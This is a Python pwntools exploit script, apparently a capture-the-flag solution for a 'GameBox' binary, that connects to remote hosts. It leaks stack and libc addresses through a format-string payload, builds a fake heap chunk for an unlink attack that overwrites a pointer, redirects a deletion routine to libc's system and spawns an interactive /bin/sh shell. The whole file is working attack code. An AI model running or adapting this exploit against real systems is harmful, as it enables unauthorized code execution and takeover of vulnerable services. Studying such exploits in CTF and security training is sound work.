# coding:utf-8

from pwn import *

LOCAL = False

rancodelist = ["NWLRBBMQBHCDARZOWKKYHIDD", "QSCDXRJMOWFRXSJYBLDBEFSA", "RCBYNECDYGGXXPKLORELLNMP", "APQFWKHOPKMCOQHNWNKUEWHS", "QMGBBUQCLJJIVSWMDKQTBXIX"]

if LOCAL:
    elf = ELF("./GameBox_fy82399ry3nc2103r")
    libc = ELF("../libc-2.23.so")
    log.info("libc main:"+hex(libc.symbols["__libc_start_main"]))
    io = remote("10.211.55.9", 22334)
    #context.log_level = 'debug'
else:
    libc = ELF("../libc-2.23.so")
    io = remote("39.107.33.43", 13570)

def mmenu(mchoice):
    io.recvuntil("(E)xit\n")
    io.sendline(mchoice)

def play(miscode, length, name):
    mmenu('P')
    io.recvuntil("Guess what I write:\n")
    io.sendline(miscode)
    io.recvuntil("great prophet!\n")
    io.recvuntil("Input your name length:\n")
    io.sendline(str(length))
    io.recvuntil("Input your name:\n")
    io.send(name)
    sleep(0.5)

def show():
    mmenu('S')

def change(idx, cookie, newname):
    mmenu('C')
    io.recvuntil("Input index:\n")
    io.sendline(str(idx))
    io.recvuntil("Input Cookie:\n")
    io.send(cookie)
    io.recvuntil("your new name(no longer than old!):\n")
    io.send(newname)

def delr(idx, cookie):
    mmenu('D')
    io.recvuntil("Input index:\n")
    io.sendline(str(idx))
    io.recvuntil("Input Cookie:\n")
    io.send(cookie)

def pwnit():
    padding = "cccc%17$lx____%13$lx".ljust(0x98, 'c')
    #padding = "%lx-%lx-%lx-%lx-%lx-%lx-%lxcccc%13$lx____%17$lx".ljust(0x88, 'c')
    #padding = "cccc%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx".ljust(0x50, 'c')
    # leak
    play(rancodelist[0], 0x98, padding)
    show()
    io.recvuntil("0:")
    io.recvuntil('c'*4)
    data = io.recvuntil('____')[:-4]
    main_addr = int(data, 16)
    log.info("main address:"+hex(main_addr))
    role_addr = main_addr + 0x20188c
    log.info("role address:"+hex(role_addr))
    data = io.recvuntil("c"*8)[:-8]
    libc_start_main = int(data, 16) - 0xF0
    log.info("libc start main:"+hex(libc_start_main))
    libc.address  = libc_start_main - libc.symbols["__libc_start_main"]
    log.info("libc address:"+hex(libc.address))
    # exp
    play(rancodelist[1], 0xF8, 'a'*0xF8)
    play(rancodelist[2], 0x58, 'a'*0x58)
    play(rancodelist[3], 0xF8, 'a'*0xF8)
    play(rancodelist[4], 0x58, 'a'*0x58)
    targe_addr = role_addr
    fake_chunk = p64(0) + p64(0x91)
    fake_chunk += p64(targe_addr-0x18) + p64(targe_addr-0x10)
    fake_chunk = fake_chunk.ljust(0x90, 'f')
    fake_chunk += p64(0x90)
    change(0, rancodelist[0], fake_chunk)
    delr(1, rancodelist[1])

    # overwrite
    padding = "/bin/sh\x00" + p64(0) + p64(0) + p64(targe_addr-0x18) + p64(0x98)
    padding += rancodelist[1] + p64(0) + p64(targe_addr-0xE8) + p64(7)
    change(0, rancodelist[0], padding)
    change(1, rancodelist[1], p64(libc.symbols["system"])[:-1])
    pause()
    delr(0, rancodelist[0][:8]+"/bin/sh\x00"+p64(0))
    io.interactive()

if __name__ == "__main__":
    pwnit()
    pause()

